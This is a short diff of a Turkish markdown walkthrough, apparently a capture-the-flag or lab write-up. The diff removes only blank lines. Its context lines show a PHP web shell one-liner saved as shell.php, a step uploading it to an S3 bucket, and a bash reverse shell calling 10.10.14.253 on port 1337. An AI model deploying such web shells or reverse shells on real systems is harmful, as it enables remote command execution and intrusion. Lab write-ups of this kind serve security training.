@@ -83,8 +83,6 @@ Aşağıdaki one-liner komutunu PHP dosyası olarak kaydet:
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
-
-
 Oluşturulan bu dosyayı S3 kovasına (bucket) yükle:
 
 ```bash
@@ -95,7 +93,6 @@ Ardından aşağıdaki reverse shell dosyasını oluştur:
 
 ```bash title="shell.sh" linenums="1"
 #!/bin/bash
-
 bash -i >&/dev/tcp/10.10.14.253/1337 0>&1
 ```
 
